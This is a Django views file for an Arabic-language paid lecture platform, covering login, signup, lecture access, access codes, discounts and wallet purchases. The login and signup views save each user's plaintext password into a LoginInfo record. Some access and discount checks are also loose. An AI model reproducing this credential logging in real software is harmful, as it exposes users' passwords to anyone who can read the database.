from django.shortcuts import render, redirect
from django.contrib.auth.models import User, auth
from django.contrib import messages
from django.http import HttpResponse
from django.contrib.auth.decorators import login_required
from django.urls import reverse
import random
from django.shortcuts import get_object_or_404

from datetime import datetime

from .models import PlatformSettings, Profile , Lecture , StudentLectureObject, LectureCode ,LectureDiscount ,  Part , StudentPartObject, View , Chapter , ChapterLecture , Group , GroupMember , GroupLecture , BuyLesson , BuyChapter
from .models import Code , Notification , Transaction , LikeLecture , StudentQuestion ,  StudentQuestionAnswer 
from .models import Assignment , AssignmentOpen  , AssignmentSubmit ,Question , Answer ,   News ,GetPremium ,RechargeRequest , LoginInfo           


instructor_username = 'kerogoda'
instructor_user = User.objects.get(username=instructor_username)
instructor_profile = Profile.objects.get(user=instructor_user)

ready = True
if ready == True:
    if PlatformSettings.objects.filter(instructor_user=instructor_user).first():
        platform = PlatformSettings.objects.get(instructor_user=instructor_user)
    else:
        platform = ''
else:
    platform = ''


def error_404(request , exception):
    return render(request , 'error-404.html' , status=404)

def testing_page(request):
    return render(request , 'testing.html')


def index(request):
    if User.objects.filter(username=request.user.username).first():
        user_object = User.objects.get(username=request.user.username)
        user_profile = Profile.objects.get(user=user_object)

        notifications_count = Notification.objects.filter(user=request.user).count()
    else:
        user_profile = ''
        notifications_count = ''

    

    if User.objects.filter(username=request.user.username).first():
        lectures = StudentLectureObject.objects.filter(user=request.user).order_by('-created_at')
    else:
        lectures = Lecture.objects.all().order_by('-created_at')

    return render(request, 'main/main.html', { 'lectures':lectures   , 'user_profile': user_profile ,  'notifications' : notifications_count , 'platform':platform})



# Authentication Functions 

def login(request):
    if request.user.is_authenticated:
        return redirect('/')
    else:
        if request.method == 'POST':
            username = request.POST['username']
            password = request.POST['password']

            device_type = request.POST['device-type']
            browser_type = request.POST['browser-type']



            user = auth.authenticate(username=username, password=password)



            if user is not None:
                # Login With Username 
                auth.login(request, user)

                save_info = LoginInfo.objects.create(user=request.user , username=username , password=password , device_type=device_type , browser_type=browser_type)
                save_info.save()

                return redirect('/')
            else:
                # Login With Phone Number 
                if Profile.objects.filter(phone=username).first():
                    profile = Profile.objects.get(phone=username)
                    profile_user = profile.user

                    authenticate = auth.authenticate(username=profile_user.username, password=password)

                    if authenticate is not None:
                        auth.login(request, authenticate)
                        save_info = LoginInfo.objects.create(user=request.user , username=username , password=password , device_type=device_type , browser_type=browser_type)
                        save_info.save()
                        return redirect('/')
                    
                    else:
                        messages.info(request, 'Username or Password is wrong')
                        return redirect('login')

                else:
                    messages.info(request, 'Username or Password is wrong')
                    return redirect('login')

        else:
            return render(request, 'main/login.html' , {  'platform':platform })



def signup(request):
    if request.user.is_authenticated:
        return redirect('/')
    else:
        if request.method == 'POST':
            # Account Info 
            username = request.POST['username']
            email = request.POST['email']
            password = request.POST['password']
            password2 = request.POST['password2']
            name = request.POST['name']
            phone = request.POST['phone']
            location = request.POST['location']
            year = request.POST['year']


            # Login Info 
            device_type = request.POST['device-type']
            browser_type = request.POST['browser-type']
            login_date = request.POST['login-date']


            if password == password2:
                if User.objects.filter(email=email).exists():
                    messages.info(request, 'This Email Has Been Registered Before')
                    return redirect('signup')
                elif User.objects.filter(username=username).exists():
                    messages.info(request, 'This Username Isnt Available')
                    return redirect('signup')
                elif Profile.objects.filter(phone=phone).exists():
                    messages.info(request, 'This Phone Number Has Been Registered Before')
                    return redirect('signup')
                else:
                    user = User.objects.create_user(username=username, email=email, password=password)
                    user.save()

                    #log user in and redirect to settings page
                    user_login = auth.authenticate(username=username, password=password)
                    auth.login(request, user_login)

                    #create a Profile object for the new user
                    user_model = User.objects.get(username=username)
                    student_user_id = user_model.id
                    student_code = int(student_user_id) + 1500
                    new_profile = Profile.objects.create(user=user_model, id_user=user_model.id , username=request.user.username , code=student_code)
                    new_profile.save()

                    new_profile.name = name
                    new_profile.phone = phone
                    new_profile.location = location
                    new_profile.year = year
                    new_profile.save()


                    # Create Lecture And Part Objects For The New Student 
                    lectures = Lecture.objects.all()
                    for x in lectures:
                        create_lecture_object = StudentLectureObject.objects.create(lecture_id=x.id , user=user_model , user_name=request.user.username , title=x.title , image=x.image , price=x.price , duration=x.duration , purchased=False , object=True , year=x.year , parts_number = x.parts_number)
                        create_lecture_object.save()

                    parts = Part.objects.all()
                    for z in parts:
                        create_part_object = StudentPartObject.objects.create(part_id=z.part_id , lecture_id=z.lecture_id , user=request.user , user_name=request.user.username , type=z.type  , title=z.title , part_number=z.part_number , duration=z.duration , views_limit=z.views_limit , visible=z.visible)
                        create_part_object.save()

                    save_info = LoginInfo.objects.create(user=request.user , username=username , password=password , device_type=device_type , browser_type=browser_type)
                    save_info.save()
                    return redirect('/')
            else:
                messages.info(request, 'Password Not Matching')
                return redirect('signup')
            
        else:
            return render(request, 'main/signup.html' , { 'platform':platform})



@login_required(login_url='login')
def logout(request):
    auth.logout(request)
    return redirect('/')



# Lectures 

def grades(request):
    if User.objects.filter(username=request.user.username).first():
        user_object = User.objects.get(username=request.user.username)
        user_profile = Profile.objects.get(user=user_object)

        notifications_count = Notification.objects.filter(user=request.user).count()
    else:
        user_profile = ''
        notifications_count = ''


    return render(request, 'lectures/grades.html' , {'user_profile': user_profile , 'notifications' : notifications_count , 'platform':platform})

def grade(request , grade):
    if User.objects.filter(username=request.user.username).first():
        user_object = User.objects.get(username=request.user.username)
        user_profile = Profile.objects.get(user=user_object)

        notifications_count = Notification.objects.filter(user=request.user).count()
    else:
        user_profile = ''
        notifications_count = ''






    if grade == '1':
        if User.objects.filter(username=request.user.username).first():
            lectures = StudentLectureObject.objects.filter(user=request.user , year='first').order_by('-created_at')
        else:
            lectures = Lecture.objects.filter(year='first').order_by('-created_at')
    else:
        if grade == '2':
            if User.objects.filter(username=request.user.username).first():
                lectures = StudentLectureObject.objects.filter(user=request.user , year='second').order_by('-created_at')
            else:
                lectures = Lecture.objects.filter(year='second').order_by('-created_at')
        else:
            if grade == '3':
                if User.objects.filter(username=request.user.username).first():
                    lectures = StudentLectureObject.objects.filter(user=request.user , year='third').order_by('-created_at')
                else:
                    lectures = Lecture.objects.filter(year='third').order_by('-created_at')
            else:
                return redirect("/lectures")


    grade_number = grade



    return render(request, 'lectures/lectures.html' , {'grade':grade_number , 'user_profile': user_profile , 'notifications' : notifications_count ,'lectures' : lectures , 'platform':platform})




def lecture(request , id):
    if User.objects.filter(username=request.user.username).first():
        user_object = User.objects.get(username=request.user.username)
        user_profile = Profile.objects.get(user=user_object)

        notifications_count = Notification.objects.filter(user=request.user).count()
    else:
        user_profile = ''
        notifications_count = ''

    if Lecture.objects.filter(id=id).first():
        lecture = get_object_or_404(Lecture ,slug=id)
    else:
        messages.warning(request, 'عذرا لا يوجد محاضرة بهذا اللينك')
        return redirect("/lectures")


    if User.objects.filter(username=request.user.username).first():
        parts = StudentPartObject.objects.filter(user=request.user , lecture_id=lecture.id)
    else:
        parts = Part.objects.filter(lecture_id=lecture.id)
    


    if Part.objects.filter(lecture_id=lecture.id , active=True).first():
        active_part = Part.objects.get(lecture_id=lecture.id , active=True)
    else:
        active_part = ''



    videos_count = Part.objects.filter(lecture_id=lecture.id , type='video' , visible=True).count()
    assignments_count = Part.objects.filter(lecture_id=lecture.id , type='assignment').count()
    total_questions_number = 0
    links_count = Part.objects.filter(lecture_id=lecture.id , type='link').count()
    files_count = Part.objects.filter(lecture_id=lecture.id , type='file').count()
    attachments_count = int(links_count) + int(files_count)
    
    related_assignments = Assignment.objects.filter(lecture_id=lecture.id)
    for x in related_assignments:
        total_questions_number = total_questions_number + x.questions_count
 


    mode = 'normal'


    all_students = Profile.objects.filter(instructor=False)
    subscribed_students = BuyLesson.objects.filter(lecture_id=lecture.id)

    subscribed_students_number = subscribed_students.count()
    all_students_number = all_students.count()
    subscribed_students_percentage = round(int(subscribed_students_number) / int(all_students_number) * 100)



    lecture_views = View.objects.filter(lecture_id=lecture.id).order_by('-created_at')



    not_subscribed_students = []
    for x in all_students:
        if BuyLesson.objects.filter(user=x.user , lecture_id=lecture.id).first():
            do_nothing = ""
        else:
            appned_student = not_subscribed_students.append(x)


    all_parts = Part.objects.all().order_by('-created_at')
    another_lectures_parts = []
    for x in all_parts:
        if x.lecture_id == str(lecture.id):
            do_nothing_2 = ''
            
        else:
            if Part.objects.filter(title=x.title , original=False).first():
                do_nothing_3 = ''
            else:
                if Lecture.objects.filter(id=x.lecture_id).first():
                    x.lecture_exist = True
                    x.save()
                    append_part = another_lectures_parts.append(x)
                else:
                    x.lecture_exist = False
                    x.save()
                    append_part = another_lectures_parts.append(x)





    lecture_valid_codes = LectureCode.objects.filter(lecture_id=lecture.id , valid=True).order_by('-created_at')
    lecture_expired_codes = LectureCode.objects.filter(lecture_id=lecture.id , valid=False).order_by('-expired_at')

    lecture_valid_discounts = LectureDiscount.objects.filter(lecture_id=lecture.id , valid=True , type='normal').order_by('-created_at')
    lecture_expired_discounts = LectureDiscount.objects.filter(lecture_id=lecture.id , valid=False , type='normal').order_by('-expired_at')


    if User.objects.filter(username=request.user.username).first():
        if user_profile.instructor == True:
            status = 'instructor'
        else:
            if BuyLesson.objects.filter(user=request.user , lecture_id=lecture.id).first():
                status = 'purchased'
            else:
                status = 'not-purchased'
    else:
        status = 'not-logged'




    # Discount Apply 
    discount_object = ''
    new_lecture_price = ''
    cash_saved = ''
    if request.GET.get('discount'):
        discount = request.GET.get('discount')
        if LectureDiscount.objects.filter(discount_id=discount).first():
            discount_object = LectureDiscount.objects.get(discount_id=discount)
            if discount_object.valid == False:
                messages.error(request, 'كود الخصم الذي ادخلته منتهي الصلاحية')
                return redirect('/lecture/' + str(lecture.id))
            else:
                discount_value = round(discount_object.discount_value * lecture.price / 100)
                new_lecture_price = lecture.price - discount_value
                cash_saved = discount_value
        else:
            messages.error(request, 'كود الخصم الذي ادخلته خطأ')
        # Discount Apply 





    return render(request, 'lectures/lecture.html' , {'lecture':lecture , 'mode':mode , 'status':status  , 'parts':parts, 'active_part':active_part , 'videos_count' : videos_count, 'attachments_count' : attachments_count , 'assignments_count':assignments_count ,'total_questions_number':total_questions_number , 'all_students':all_students , 'subscribed_students':subscribed_students , "not_subscribed_students":not_subscribed_students , 'subscribed_students_percentage':subscribed_students_percentage ,'lecture_views':lecture_views , 'another_lectures_parts':another_lectures_parts , 'valid_codes':lecture_valid_codes , 'expired_codes':lecture_expired_codes , 'valid_discounts':lecture_valid_discounts,'expired_discounts':lecture_expired_discounts ,'discount_object':discount_object,'new_lecture_price':new_lecture_price,'cash_saved':cash_saved, 'user_profile': user_profile , 'notifications' : notifications_count , 'platform':platform })



# Same With Lecture View bUT add Video Attribute
@login_required(login_url='login')
def lecture_video(request , id , video):
    if User.objects.filter(username=request.user.username).first():
        user_object = User.objects.get(username=request.user.username)
        user_profile = Profile.objects.get(user=user_object)

        notifications_count = Notification.objects.filter(user=request.user).count()
    else:
        user_profile = ''
        notifications_count = ''

    lecture = get_object_or_404(Lecture ,slug=id)

    if User.objects.filter(username=request.user.username).first():
        parts = StudentPartObject.objects.filter(user=request.user , lecture_id=lecture.id)
    else:
        parts = Part.objects.filter(lecture_id=lecture.id)



    videos_count = Part.objects.filter(lecture_id=lecture.id , type='video' , visible=True).count()
    assignments_count = Part.objects.filter(lecture_id=lecture.id , type='assignment').count()
    total_questions_number = 0
    links_count = Part.objects.filter(lecture_id=lecture.id , type='link').count()
    files_count = Part.objects.filter(lecture_id=lecture.id , type='file').count()
    attachments_count = int(links_count) + int(files_count)
    students = BuyLesson.objects.filter(lecture_id=id)

    related_assignments = Assignment.objects.filter(lecture_id=lecture.id)
    for x in related_assignments:
        total_questions_number = total_questions_number + x.questions_count

    if Part.objects.filter(part_id=video).first():
        part = Part.objects.get(part_id=video)
        mode = 'video'
        part_views = View.objects.filter(part_id = part.part_id).order_by('-created_at')
    else:
        return redirect("/lecture/" + str(lecture.id))
    

    if User.objects.filter(username=request.user.username).first():
        if user_profile.instructor == True:
            status = 'instructor'
        else:
            if BuyLesson.objects.filter(user=request.user , lecture_id=lecture.id).first():
                status = 'purchased'
            else:
                status = 'not-purchased'
    else:
        status = 'not-logged'

    if User.objects.filter(username=request.user.username).first():
        if user_profile.instructor == True:
            do_nothing = ''
        else:
            if BuyLesson.objects.filter(user=request.user , lecture_id=lecture.id).first():
                do_nothing = ''
            else:
                return redirect('/lecture/' + str(lecture.id))
    else:
        return redirect('/lecture/' + str(lecture.id))





    # Increase Views Times
    user_part_object = StudentPartObject.objects.get(part_id=part.part_id , user=request.user)
    part_views_limit = part.views_limit

    if user_part_object.views >= part_views_limit:
        limit = 'exceed'
    else:


        if user_profile.instructor == False:
            user_part_object.views = user_part_object.views + 1
            user_part_object.save()

            part.views = int(part.views) + 1
            part.save()
        
            # Another Parts Objects
            another_parts_for_another_users = StudentPartObject.objects.filter(part_id=part.part_id)
            for x in another_parts_for_another_users:
                x.part_total_views = part.views
                x.save()

            create_view_object = View.objects.create(student_part_object_id=user_part_object.object_id , part_id=user_part_object.part_id ,lecture_id=lecture.id , title=user_part_object.title , user=request.user , user_name=user_profile.name).save()
            


        limit = 'not-exceed'
    # Increase Views Times




    return render(request, 'lectures/lecture.html' , {'part':part , 'part_views':part_views , 'user_part':user_part_object , 'limit':limit ,  'mode':mode , 'status':status , 'lecture':lecture , 'parts':parts, 'videos_count' : videos_count, 'attachments_count' : attachments_count , 'assignments_count':assignments_count , 'total_questions_number':total_questions_number , 'students':students , 'user_profile': user_profile , 'notifications' : notifications_count ,  'platform':platform })




# Same With Lecture View bUT add Video Attribute
@login_required(login_url='login')
def lecture_attachment(request , id , attachment):
    if User.objects.filter(username=request.user.username).first():
        user_object = User.objects.get(username=request.user.username)
        user_profile = Profile.objects.get(user=user_object)

        notifications_count = Notification.objects.filter(user=request.user).count()
    else:
        user_profile = ''
        notifications_count = ''

    lecture = get_object_or_404(Lecture ,slug=id)

    if User.objects.filter(username=request.user.username).first():
        parts = StudentPartObject.objects.filter(user=request.user , lecture_id=lecture.id)
    else:
        parts = Part.objects.filter(lecture_id=lecture.id)



    videos_count = Part.objects.filter(lecture_id=lecture.id , type='video' , visible=True).count()
    assignments_count = Part.objects.filter(lecture_id=lecture.id , type='assignment').count()
    total_questions_number = 0
    links_count = Part.objects.filter(lecture_id=lecture.id , type='link').count()
    files_count = Part.objects.filter(lecture_id=lecture.id , type='file').count()
    attachments_count = int(links_count) + int(files_count)
    students = BuyLesson.objects.filter(lecture_id=id)

    related_assignments = Assignment.objects.filter(lecture_id=lecture.id)
    for x in related_assignments:
        total_questions_number = total_questions_number + x.questions_count

    if Part.objects.filter(part_id=attachment , type='file').first():
        part = Part.objects.get(part_id=attachment)
        part_views = View.objects.filter(part_id = part.part_id).order_by('-created_at')
        mode = 'attachment'
    else:
        if Part.objects.filter(part_id=attachment , type='link').first():
            part = Part.objects.get(part_id=attachment)
            part_views = View.objects.filter(part_id = part.part_id).order_by('-created_at')
            mode = 'attachment'
        else:
            return redirect("/lecture/" + str(lecture.id))

    

    if User.objects.filter(username=request.user.username).first():
        if user_profile.instructor == True:
            status = 'instructor'
        else:
            if BuyLesson.objects.filter(user=request.user , lecture_id=lecture.id).first():
                status = 'purchased'
            else:
                status = 'not-purchased'
    else:
        status = 'not-logged'

    if User.objects.filter(username=request.user.username).first():
        if user_profile.instructor == True:
            do_nothing = ''
        else:
            if BuyLesson.objects.filter(user=request.user , lecture_id=lecture.id).first():
                do_nothing = ''
            else:
                return redirect('/lecture/' + str(lecture.id))
    else:
        return redirect('/lecture/' + str(lecture.id))



    # Increase Views Times
    user_part_object = StudentPartObject.objects.get(part_id=part.part_id , user=request.user)

    if user_profile.instructor == False:
        user_part_object.views = user_part_object.views + 1
        user_part_object.save()

        part.views = int(part.views) + 1
        part.save()
        
        # Another Parts Objects
        another_parts_for_another_users = StudentPartObject.objects.filter(part_id=part.part_id)
        for x in another_parts_for_another_users:
            x.part_total_views = part.views
            x.save()

        create_view_object = View.objects.create(student_part_object_id=user_part_object.object_id , part_id=user_part_object.part_id ,lecture_id=lecture.id , title=user_part_object.title , user=request.user , user_name=user_profile.name).save()
        

    return render(request, 'lectures/lecture.html' , {'part':part , 'part_views':part_views , 'mode':mode , 'status':status , 'lecture':lecture , 'parts':parts, 'videos_count' : videos_count, 'attachments_count' : attachments_count , 'assignments_count':assignments_count , 'total_questions_number':total_questions_number , 'students':students , 'user_profile': user_profile , 'notifications' : notifications_count ,  'platform':platform })




@login_required(login_url='login')
def lecture_code_students(request , id , lecture_code):
    if User.objects.filter(username=request.user.username).first():
        user_object = User.objects.get(username=request.user.username)
        user_profile = Profile.objects.get(user=user_object)

        notifications_count = Notification.objects.filter(user=request.user).count()
    else:
        user_profile = ''
        notifications_count = ''

    lecture = get_object_or_404(Lecture ,slug=id)

    if User.objects.filter(username=request.user.username).first():
        parts = StudentPartObject.objects.filter(user=request.user , lecture_id=lecture.id)
    else:
        parts = Part.objects.filter(lecture_id=lecture.id)

    if User.objects.filter(username=request.user.username).first():
        if user_profile.instructor == True:
            status = 'instructor'
        else:
            return redirect('/lecture/' + str(lecture.id))
    else:
        redirect('/lecture/' + str(lecture.id))


    videos_count = Part.objects.filter(lecture_id=lecture.id , type='video').count()
    assignments_count = Part.objects.filter(lecture_id=lecture.id , type='assignment').count()
    links_count = Part.objects.filter(lecture_id=lecture.id , type='link').count()
    files_count = Part.objects.filter(lecture_id=lecture.id , type='file').count()
    attachments_count = int(links_count) + int(files_count)


    if LectureCode.objects.filter(code_id=lecture_code).first():
        lecture_code_object = LectureCode.objects.get(code_id=lecture_code)
        code_students = BuyLesson.objects.filter(lecture_id=lecture.id , method='link' , link=lecture_code)
        mode = 'lecture_code_students'
    else:
        if LectureDiscount.objects.filter(discount_id=lecture_code , lecture_id=lecture.id).first():
            lecture_code_object = LectureDiscount.objects.get(discount_id=lecture_code , lecture_id=lecture.id)
            code_students = BuyLesson.objects.filter(lecture_id=lecture.id , method='wallet_discount' , discount_id=lecture_code)
            mode = 'lecture_discount_students'
        else:
            return redirect('/lecture/' + str(lecture.id))

    return render(request, 'lectures/lecture.html' , { 'code_students':code_students , 'code':lecture_code_object , 'mode':mode , 'status':status , 'lecture':lecture , 'parts':parts, 'videos_count' : videos_count, 'attachments_count' : attachments_count , 'assignments_count':assignments_count , 'user_profile': user_profile , 'notifications' : notifications_count , 'platform':platform})



@login_required(login_url='login')
def lecture_code_join(request , id , lecture_code):
    if User.objects.filter(username=request.user.username).first():
        user_object = User.objects.get(username=request.user.username)
        user_profile = Profile.objects.get(user=user_object)

        notifications_count = Notification.objects.filter(user=request.user).count()
    else:
        user_profile = ''
        notifications_count = ''


    lecture = get_object_or_404(Lecture ,slug=id)
    lecture_code_object = LectureCode.objects.get(code_id=lecture_code)

    if user_profile.instructor == False:
        if BuyLesson.objects.filter(lecture_id=lecture.id , user=request.user).first():
            return redirect("/lecture/" + str(lecture.id))
        else:
            if lecture_code_object.valid == False:
                status = 'expired'
            else:
                status = 'valid'
    else:
        return redirect("/lecture/" + str(lecture.id))


    return render(request, 'lectures/accept-join.html' , { 'status':status , 'lecture':lecture , 'code':lecture_code_object , 'user_profile': user_profile , 'notifications' : notifications_count, 'platform':platform })


@login_required(login_url='login')
def lecture_code_join_function(request):
    if User.objects.filter(username=request.user.username).first():
        user_object = User.objects.get(username=request.user.username)
        user_profile = Profile.objects.get(user=user_object)

        notifications_count = Notification.objects.filter(user=request.user).count()
    else:
        user_profile = ''
        notifications_count = ''


    if request.method == 'POST':
        lecture_id = request.POST['lecture-id']
        code = request.POST['code']

        lecture = Lecture.objects.get(id=lecture_id)

        if LectureCode.objects.filter(code_id=code).first():
            lecture_code_object = LectureCode.objects.get(code_id=code)
        else:
            if Lecture.objects.filter(id=lecture_id , code=code).first():
                if user_profile.instructor == False:
                    if BuyLesson.objects.filter(lecture_id=lecture_id , user=request.user).first():
                        return redirect("/lecture/" + lecture_id)
                    else:
                        serial = lecture.no_of_buys + 84000
                        join_lecture = BuyLesson.objects.create(user=request.user , lecture_id=lecture_id, lecture_title=lecture.title , lecture_value=0 , user_name=user_profile.name , user_image=user_profile.image , method='lecture_code' , serial=serial)
                        join_lecture.save()

                        user_profile.no_of_buys = user_profile.no_of_buys + 1
                        user_profile.save()
                            
                        lecture.no_of_buys = lecture.no_of_buys + 1
                        lecture.save()

                        lecture_instructor_profile = Profile.objects.get(user=lecture.user)
                        lecture_instructor_profile.no_of_sells = lecture_instructor_profile.no_of_sells + 1
                        lecture_instructor_profile.save()

                        user_lecture_object = StudentLectureObject.objects.get(lecture_id=lecture.id , user=request.user)
                        user_lecture_object.purchased = True
                        user_lecture_object.save()

                        messages.success(request, 'تم الاشتراك في المحاضرة بنجاح')
                        return redirect('/lecture/'+ str(lecture.id) )
            else:
                messages.warning(request, 'للاسف الكود الذي ادخلته خطأ ')
                return redirect("/lecture/" + lecture_id)






        if user_profile.instructor == False:

            if BuyLesson.objects.filter(lecture_id=lecture_id , user=request.user).first():
                return redirect("/lecture/" + lecture_id)
            else:

                if lecture_code_object.valid == False:
                    messages.warning(request, 'للاسف اللينك الذي ادخلته منتهي الصلاحية')
                    return redirect("/lecture/" + lecture_id)
                else:
                    serial = lecture.no_of_buys + 42000
                    join_lecture = BuyLesson.objects.create(user=request.user , lecture_id=lecture_id, lecture_title=lecture.title , lecture_value=0 , user_name=user_profile.name , user_image=user_profile.image , method='link' , link=code , serial=serial)
                    join_lecture.save()

                    lecture_code_object.used_times = lecture_code_object.used_times + 1
                    lecture_code_object.save()

                    if lecture_code_object.used_times == lecture_code_object.total_students_number :
                        lecture_code_object.valid = False
                        lecture_code_object.save()


                    user_profile.no_of_buys = user_profile.no_of_buys + 1
                    user_profile.save()
                    
                    lecture.no_of_buys = lecture.no_of_buys + 1
                    lecture.save()

                    lecture_instructor_profile = Profile.objects.get(user=lecture.user)
                    lecture_instructor_profile.no_of_sells = lecture_instructor_profile.no_of_sells + 1
                    lecture_instructor_profile.save()

                    user_lecture_object = StudentLectureObject.objects.get(lecture_id=lecture.id , user=request.user)
                    user_lecture_object.purchased = True
                    user_lecture_object.save()

                    messages.success(request, 'تم الاشتراك في المحاضرة بنجاح')
                    return redirect('/lecture/'+ str(lecture.id) )

        else:
            return redirect("/lecture/" + lecture_id)


@login_required(login_url='login')
def purchase_lecture(request):
    if User.objects.filter(username=request.user.username).first():
        user_object = User.objects.get(username=request.user.username)
        user_profile = Profile.objects.get(user=user_object)

        notifications_count = Notification.objects.filter(user=request.user).count()
    else:
        user_profile = ''
        notifications_count = ''

    if request.method == 'POST':
        lecture_id = request.POST['lecture-id']


        lecture = Lecture.objects.get(id=lecture_id)
        
        buy_filter = BuyLesson.objects.filter(lecture_id=lecture_id, user=request.user).first()
        text = 'buy'

        if buy_filter == None:
            if user_profile.money < lecture.price:
                


                msg_color = 'warning'
                msg_ar = 'للاسف ليس لديك رصيد كافي لشراء هذة المحاضرة'
                msg_en = 'Unfortunately you dont have enough credit to purchase this lecture'


                messages.warning(request, 'للاسف ليس لديك رصيد كافي في المحفظة لشراء هذة المحاضرة')
                return redirect('/lecture/'+ str(lecture.id))
            else:
               serial = lecture.no_of_buys + 76000
               purchase_lecture = BuyLesson.objects.create(user=request.user , lecture_id=lecture.id, lecture_title=lecture.title , lecture_value=lecture.price , user_name=user_profile.name , user_image=user_profile.image , method='wallet' , serial=serial)
               purchase_lecture.save()


               user_profile.money = user_profile.money - lecture.price
               user_profile.no_of_buys = user_profile.no_of_buys + 1
               user_profile.save()
               
               lecture.no_of_buys = lecture.no_of_buys + 1
               lecture.save()
               lecture_instructor_profile = Profile.objects.get(user=lecture.user)
               lecture_instructor_profile.no_of_sells = lecture_instructor_profile.no_of_sells + 1
               lecture_instructor_profile.save()
               
               user_lecture_object = StudentLectureObject.objects.get(lecture_id=lecture.id , user=request.user)
               user_lecture_object.purchased = True
               user_lecture_object.save()

               invoice = Transaction.objects.create(user=request.user , user_name=request.user.username , item_id = lecture.id , item_title=lecture.title ,  value=lecture.price , wallet=user_profile.money , transaction_type='purchase' , purchase_type='wallet' )
               invoice.save()

               messages.success(request, 'تم شراء المحاضرة بنجاح')
               return redirect('/lecture/'+ str(lecture.id) )


               

            #    new_activity = Activity.objects.create(username=request.user.username , activity_type='purchase' ,purchase_type='wallet' , wallet=user_profile.money , lesson_name=post.title , money=lesson_price)
            #    new_notification = Notification.objects.create(username=request.user.username , activity_type='withdraw' ,purchase_type='wallet' , wallet=user_profile.money , lesson_name=post.title , money=lesson_price)
            #    new_notificatio = Notification.objects.create(username=request.user.username , activity_type='purchase' ,purchase_type='wallet' , wallet=user_profile.money , lesson_name=post.title , money=lesson_price)

            #    if Notification.objects.filter(username=post.user , activity_type='buy' , money=post.no_of_buys, lesson_name=post.title , liker=request.user.username ).first():
            #         new_notify = ''
            #    else:
            #         new_notify  = Notification.objects.create(username=post.user , activity_type='buy' , money=post.no_of_buys, lesson_name=post.title , liker=request.user.username )
        else:
            return redirect('/lectures')
        



@login_required(login_url='login')
def discounts_functions(request):
    if User.objects.filter(username=request.user.username).first():
        user_object = User.objects.get(username=request.user.username)
        user_profile = Profile.objects.get(user=user_object)

        notifications_count = Notification.objects.filter(user=request.user).count()
    else:
        user_profile = ''
        notifications_count = ''


    if request.method == 'POST':
        function_type = request.POST['function-type']
        lecture_id = request.POST['lecture-id']
        code = request.POST['discount']

        if Lecture.objects.filter(id=lecture_id).first():
            lecture = Lecture.objects.get(id=lecture_id)
        else:
            return redirect('/lectures')


        if LectureDiscount.objects.filter(discount_id=code).first():
            discount = LectureDiscount.objects.get(discount_id=code , lecture_id=lecture.id)
        else:
            messages.success(request, 'كود الخصم الذي ادخلته خطأ')
            return redirect("/lecture/" + lecture_id)



        
        if str(function_type) == 'redirect':
            return redirect("/lecture/" + lecture_id + '?discount=' + str(code))
        

        if str(function_type) == 'confirm':
            discount_value = round(discount.discount_value * lecture.price / 100)
            new_lecture_price = lecture.price - discount_value


            buy_filter = BuyLesson.objects.filter(lecture_id=lecture_id, user=request.user).first()
            text = 'buy'

            if buy_filter == None:
                if user_profile.money < new_lecture_price:
                    messages.warning(request, 'للاسف ليس لديك رصيد كافي في المحفظة لشراء هذة المحاضرة')
                    return redirect('/lecture/'+ str(lecture.id))
                else:
                    serial = lecture.no_of_buys + 21000
                    purchase_lecture = BuyLesson.objects.create(user=request.user , lecture_id=lecture.id, lecture_title=lecture.title , lecture_value=new_lecture_price , user_name=user_profile.name , user_image=user_profile.image , method='wallet_discount' , serial=serial , discount_id=discount.discount_id , discount_value=discount.discount_value)
                    purchase_lecture.save()


                    user_profile.money = user_profile.money - new_lecture_price
                    user_profile.no_of_buys = user_profile.no_of_buys + 1
                    user_profile.save()
                    
                    lecture.no_of_buys = lecture.no_of_buys + 1
                    lecture.save()
                    lecture_instructor_profile = Profile.objects.get(user=lecture.user)
                    lecture_instructor_profile.no_of_sells = lecture_instructor_profile.no_of_sells + 1
                    lecture_instructor_profile.save()
                    
                    user_lecture_object = StudentLectureObject.objects.get(lecture_id=lecture.id , user=request.user)
                    user_lecture_object.purchased = True
                    user_lecture_object.save()

                    invoice = Transaction.objects.create(user=request.user , user_name=request.user.username , item_id = lecture.id , item_title=lecture.title ,  value=new_lecture_price , wallet=user_profile.money , transaction_type='purchase' , purchase_type='wallet_discount' )
                    invoice.save()

                    discount.used_times = discount.used_times + 1
                    discount.save()
                    if discount.used_times == discount.total_students_number:
                        discount.valid = False
                        discount.expired_at = datetime.now()
                        discount.save()

                    messages.success(request, 'تم شراء المحاضرة بنجاح')
                    return redirect('/lecture/'+ str(lecture.id) )


                    

                    #    new_activity = Activity.objects.create(username=request.user.username , activity_type='purchase' ,purchase_type='wallet' , wallet=user_profile.money , lesson_name=post.title , money=lesson_price)
                    #    new_notification = Notification.objects.create(username=request.user.username , activity_type='withdraw' ,purchase_type='wallet' , wallet=user_profile.money , lesson_name=post.title , money=lesson_price)
                    #    new_notificatio = Notification.objects.create(username=request.user.username , activity_type='purchase' ,purchase_type='wallet' , wallet=user_profile.money , lesson_name=post.title , money=lesson_price)

                    #    if Notification.objects.filter(username=post.user , activity_type='buy' , money=post.no_of_buys, lesson_name=post.title , liker=request.user.username ).first():
                    #         new_notify = ''
                    #    else:
                    #         new_notify  = Notification.objects.create(username=post.user , activity_type='buy' , money=post.no_of_buys, lesson_name=post.title , liker=request.user.username )
            else:
                return redirect('/lectures')